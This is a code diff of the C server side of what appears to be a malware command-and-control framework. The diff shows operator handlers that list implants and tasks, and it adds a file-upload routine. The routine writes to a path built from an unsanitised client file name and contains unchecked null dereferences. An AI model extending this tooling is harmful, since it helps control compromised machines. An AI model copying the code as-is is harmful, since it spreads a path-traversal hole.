@@ -9,7 +9,10 @@
 #include <sys/socket.h>
 #include <unistd.h>
 #include <netinet/in.h>
-
+#include <fcntl.h>
+#include <dirent.h>
+#include <sys/types.h>
+#include <sys/stat.h>
 
 #include <openssl/evp.h>
 #include <openssl/x509v3.h>
@@ -297,102 +300,67 @@ void *operator_handler(void *Args) {
             }            
             SSL_write(ssl, is_valid, strlen(is_valid));
             free(is_valid);
-        }
-        cJSON_Delete(requested_info);
-    }
-        
-    log_message(LOG_INFO, "Closed connection");
-    SSL_free(ssl);
-
-    return NULL;
-}
-
-
-/*
-
-void *operator_handler(void *Args) {
-    
-
-
-    struct operator_handler_args_t *args = (struct operator_handler_args_t*)Args;
-    SSL *ssl = args->ssl;
-
-    // 3 tries
-    int try = 1;
-    do {
-        if (autheticate(ssl) == 0) {
-            goto START;
-        } 
-        try++;
-    } while (try <= 3);
-
-
-    return NULL;
-    
-    
-    // operator requesting infomartion or add new tasks
-    START:
-    while (1) {
-        char buffer[1024];
-        memset(buffer, 0, sizeof(buffer));
-        int bytes_received = SSL_read(ssl, buffer, sizeof(buffer) - 1); // recv(sock, buffer, sizeof(buffer), 0);
-        if (bytes_received <= 0) {
-            //perror("recv failed");
-            log_message(LOG_ERROR, "Failed to receive data from operator");
-            return NULL;
-        }
-
-        buffer[bytes_received] = '\0'; 
-        cJSON *requested_info = cJSON_Parse(buffer);
-        if (requested_info == NULL) {
-            //fprintf(stderr, "Failed to parse JSON: %s\n", buffer);
-            log_message(LOG_ERROR, "Failed to parse JSON [Operator Handler]: %s", buffer);
-            return NULL;
-        }
-
-        cJSON *about = cJSON_GetObjectItem(requested_info, "Info");
-        if (about == NULL || !cJSON_IsString(about) || about->valuestring == NULL) {
-            //fprintf(stderr, "Missing or invalid 'Info' field in JSON\n");
-            log_message(LOG_ERROR, "Missing or Invalid 'Info' field in the JSON [Operator Handler]");
-            cJSON_Delete(requested_info);
-            return NULL;
-        }
-
-        if (strncmp(about->valuestring, "Implants", 8) == 0){ // all info about implants
-            char *implants = GetData("Implants");
-            //send(sock, agents, strlen(agents), 0);
-            //if (implants == NULL) {
-            //    // handle this
-            //    continue;
-            //    }
-            
-            SSL_write(ssl, implants, strlen(implants));
-            free(implants);
-        } else if (strcmp(about->valuestring, "Tasks") == 0) {
-            char *tasks = GetData("Tasks");
-            //send(sock, tasks, strlen(tasks), 0);
-            SSL_write(ssl, tasks, strlen(tasks));
-            free(tasks);
-        } else if (strcmp(about->valuestring, "implant_id") == 0) {
-            char *data = interact_with_implant(requested_info);
-            if (data == NULL) {
-                //send(sock, "ERROR", strlen("ERROR"), 0);
-                //SSL_write(ssl, reply_, sizeof("ERROR"));    
-                continue;
+        } else if (strcmp(about->valuestring, "files") == 0) {
+            cJSON *option = cJSON_GetObjectItem(requested_info, "option");
+            if (strcmp(option->valuestring, "upload") == 0) {
+                operator_file_download(ssl);
+            } else {
+                operator_file_upload(ssl);
             }
-            //send(sock, data, strlen(data), 0);
-            SSL_write(ssl, data, strlen(data));
-            free(data);
-        } else if (strncmp(about->valuestring, "exit", 4) == 0 ) {
-            log_message(LOG_INFO, "Operator [%s] Exiting", USERNAME);
-            return NULL;
+            
         }
         cJSON_Delete(requested_info);
-    }
+    } 
         
     log_message(LOG_INFO, "Closed connection");
     SSL_free(ssl);
+
     return NULL;
 }
 
-*/
+int operator_file_download(SSL *ssl) {
+    // check if folder exists
+    if (check_if_dir_exists("./uploads_operator/") == false) {
+        if (create_dir("./uploads_operator") == false) {
+            return -1;
+        }
+    }
+    char filename[BUFFER_SIZE];
+    SSL_read(ssl, filename, sizeof(filename) -1);
+    cJSON *get_filename = cJSON_Parse(filename);
+    if (!get_filename) {
+        log_message(LOG_ERROR, "Failed to ");
+        return -1;
+    }
+
+    cJSON *name = cJSON_GetObjectItem(get_filename, "file_name");
+    //memset(filename, 0, sizeof(filename));
+    strncpy(filename, name->valuestring, sizeof(filename)-1);
+    log_message(LOG_INFO, "Receiving file with name : %s", filename);
+    cJSON_Delete(get_filename);
+
+    char *contents = (char*)malloc(MAX_INFO);
+    char filepath[BUFFER_SIZE + 32]; // = "./uploads_operator";
+    
+    
+    snprintf(filepath, sizeof(filepath), "./uploads_operator/%s", filename);
+
+    int fd = open(filepath, O_WRONLY|O_CREAT|O_TRUNC, 0644);
+    if (fd == -1) {
+        log_message(LOG_ERROR, "Failed to create file descriptor for : %s", filepath);
+        return -1;
+    }
+
+    log_message(LOG_INFO, "Writing to file : %s ", filepath);
+    size_t bytesRead;
+    while ((bytesRead = SSL_read(ssl, contents, FILE_CHUNK)) > 0) {
+        write(fd, contents, bytesRead);
+    }
+    log_message(LOG_INFO, "Wrote data to file : %s ", filepath);
+    free(contents);
+    return 0;
+}
+
+int operator_file_upload(SSL *ssl) {
+    return 0;
+}
